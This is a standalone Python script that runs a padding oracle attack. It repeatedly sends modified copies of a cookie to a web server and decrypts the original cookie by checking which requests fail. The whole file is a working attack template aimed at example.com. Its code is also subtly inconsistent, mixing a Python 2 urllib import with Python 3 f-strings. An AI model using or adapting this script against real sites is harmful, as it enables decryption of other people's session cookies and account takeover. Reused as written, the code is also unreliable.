#!/usr/bin/env python3
from paddingoracle import BadPaddingException, PaddingOracle
from base64 import b64encode, b64decode
from urllib import quote, unquote
import requests
import socket
import time

class PadBuster(PaddingOracle):
    def __init__(self, **kwargs):
        super(PadBuster, self).__init__(**kwargs)
        self.session = requests.Session()
        self.wait = kwargs.get('wait', 2.0)

    def oracle(self, data, **kwargs):
        somecookie = quote(b64encode(data))
        self.session.cookies['somecookie'] = somecookie

        while 1:
            try:
                response = self.session.get('http://www.example.com/',
                           stream=False, timeout=5, verify=False)
                break
            except (socket.error, requests.exceptions.RequestException):
                logging.exception('Retrying request in %.2f seconds...', self.wait)
                time.sleep(self.wait)
                continue

        self.history.append(response)

        if response.ok:
            logging.debug(f'No padding exception raised on {somecookie}')
            return

        raise BadPaddingException

if __name__ == '__main__':
    import logging
    import sys

    if not sys.argv[1:]:
        print(f'Usage: {sys.argv[0]} <somecookie value>')
        sys.exit(1)

    logging.basicConfig(level=logging.DEBUG)

    encrypted_cookie = b64decode(unquote(sys.argv[1]))

    padbuster = PadBuster()

    cookie = padbuster.decrypt(encrypted_cookie, block_size=8, iv=bytearray(8))

    print(f'Decrypted somecookie: {sys.argv[1]} => {cookie}')
